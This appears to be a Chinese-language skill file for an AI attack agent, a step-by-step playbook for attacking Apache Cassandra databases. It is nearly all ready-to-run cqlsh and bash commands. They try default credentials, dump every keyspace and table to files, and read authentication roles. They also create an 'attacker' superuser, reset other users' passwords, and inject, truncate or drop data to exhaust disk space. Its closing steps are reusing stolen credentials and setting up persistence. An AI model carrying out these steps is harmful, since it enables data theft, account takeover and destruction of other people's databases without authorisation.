---
name: cassandra-attack
type: attack
category: database
platform: cassandra
severity: medium
---

# Cassandra 攻击技能

## 触发条件

- 发现 Cassandra 实例
- 可以访问 Cassandra
- 用户要求"攻击 Cassandra"

## 前置检查

```bash
# 1. 测试连接
cqlsh cassandra.example.com 9042

# 2. 检查集群状态
nodetool status

# 3. 获取集群信息
cqlsh -e "DESCRIBE CLUSTER;"
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试无认证连接
cqlsh cassandra.example.com 9042

# 2. 测试默认凭证
# Cassandra 默认无认证，除非配置了 auth
cqlsh -u cassandra -p cassandra cassandra.example.com 9042

# 3. 测试常见用户
for user in "cassandra" "admin" "root"; do
  echo "Testing $user"
  cqlsh -u $user -p password cassandra.example.com 9042
done
```

### 方法 2: Keyspace 枚举

```bash
# 1. 列出所有 Keyspace
cqlsh -e "DESCRIBE KEYSPACES;"

# 2. 切换到特定 Keyspace
cqlsh -e "USE keyspace_name;"

# 3. 获取 Keyspace 详情
cqlsh -e "DESCRIBE KEYSPACE keyspace_name;"

# 4. 常见系统 Keyspaces:
# - system: 系统元数据
# - system_auth: 认证数据
# - system_traces: 跟踪数据
# - system_distributed: 分布式数据
```

### 方法 3: 表数据窃取

```bash
# 1. 列出所有表
cqlsh -e "USE keyspace_name; DESCRIBE TABLES;"

# 2. 获取表结构
cqlsh -e "USE keyspace_name; DESCRIBE TABLE table_name;"

# 3. 读取所有数据
cqlsh -e "USE keyspace_name; SELECT * FROM table_name;"

# 4. 导出数据到 CSV
cqlsh -e "COPY keyspace_name.table_name TO '/tmp/data.csv';"
```

### 方法 4: 用户凭证窃取

```bash
# 1. 如果有权限访问 system_auth
cqlsh -e "USE system_auth; SELECT * FROM roles;"

# 2. 获取所有用户
cqlsh -e "SELECT * FROM system_auth.roles;"

# 3. 获取用户权限
cqlsh -e "LIST ALL PERMISSIONS OF user_name;"

# 4. 查看角色成员
cqlsh -e "SELECT * FROM system_auth.role_members;"
```

### 方法 5: 敏感数据搜索

```bash
# 1. 搜索包含密码的表
cqlsh -e "SELECT * FROM table_name WHERE column LIKE '%password%' ALLOW FILTERING;"

# 2. 搜索包含 token 的数据
cqlsh -e "SELECT * FROM table_name WHERE column LIKE '%token%' ALLOW FILTERING;"

# 3. 批量导出所有表数据
for keyspace in $(cqlsh -e "DESCRIBE KEYSPACES;" | tail -n +3); do
  for table in $(cqlsh -e "USE $keyspace; DESCRIBE TABLES;" | tail -n +3); do
    echo "Exporting $keyspace.$table"
    cqlsh -e "USE $keyspace; SELECT * FROM $table;" > /tmp/$keyspace.$table.csv
  done
done
```

### 方法 6: 系表利用

```bash
# 1. 访问系统表
cqlsh -e "USE system; SELECT * FROM local;"
cqlsh -e "USE system; SELECT * FROM peers;"

# 2. 获取集群拓扑
cqlsh -e "SELECT peer, data_center, rack, release_version FROM system.peers;"

# 3. 获取配置信息
cqlsh -e "SELECT * FROM system.config;"

# 4. 查看大小估算
cqlsh -e "SELECT * FROM system.size_estimates;"
```

### 方法 7: Traces 利用

```bash
# 1. 访问 traces（如果启用）
cqlsh -e "USE system_traces; SELECT * FROM sessions;"

# 2. 获取最近的 traces
cqlsh -e "USE system_traces; SELECT * FROM sessions WHERE started_at > toTimestamp(now()) - 1d ALLOW FILTERING;"

# 3. 获取 events
cqlsh -e "USE system_traces; SELECT * FROM events WHERE session_id = SESSION_ID;"
```

### 方法 8: 权限提升

```bash
# 1. 创建超级用户（如果有 CREATE USER 权限）
cqlsh -e "CREATE USER IF NOT EXISTS attacker WITH PASSWORD 'password' SUPERUSER;"

# 2. 授予所有权限
cqlsh -e "GRANT ALL PERMISSIONS ON ALL KEYSPACES TO attacker;"

# 3. 修改现有用户密码
cqlsh -e "ALTER USER existing_user WITH PASSWORD 'newpassword';"

# 4. 授予特定权限
cqlsh -e "GRANT SELECT, MODIFY ON KEYSPACE keyspace_name TO attacker;"
```

### 方法 9: 数据注入

```bash
# 1. 插入恶意数据
cqlsh -e "INSERT INTO keyspace_name.table_name (id, data) VALUES (1, 'malicious');"

# 2. 批量插入
cqlsh -e "COPY keyspace_name.table_name FROM '/tmp/malicious.csv';"

# 3. 更新数据
cqlsh -e "UPDATE keyspace_name.table_name SET column = 'value' WHERE id = 1;"

# 4. 删除数据
cqlsh -e "DELETE FROM keyspace_name.table_name WHERE id = 1;"
```

### 方法 10: 性能攻击

```bash
# 1. 创建大量数据导致磁盘耗尽
for i in {1..1000000}; do
  cqlsh -e "INSERT INTO keyspace.large_table (id, data) VALUES ($i, 'A'x1000);"
done

# 2. 创建复杂查询拖慢系统
cqlsh -e "SELECT * FROM large_table ALLOW FILTERING;"

# 3. 删除关键数据
cqlsh -e "TRUNCATE keyspace_name.critical_table;"
cqlsh -e "DROP TABLE keyspace_name.critical_table;"
```

## 验证成功

```bash
# 成功连接
cqlsh cassandra.example.com 9042

# 成功列出 Keyspaces
cqlsh -e "DESCRIBE KEYSPACES;"

# 成功读取数据
cqlsh -e "SELECT * FROM keyspace_name.table_name;"
```

## 下一步

1. 分析窃取的数据中的敏感信息
2. 使用发现的凭证访问其他系统
3. 通过 Cassandra 建立持久化
4. 攻击使用 Cassandra 的应用程序
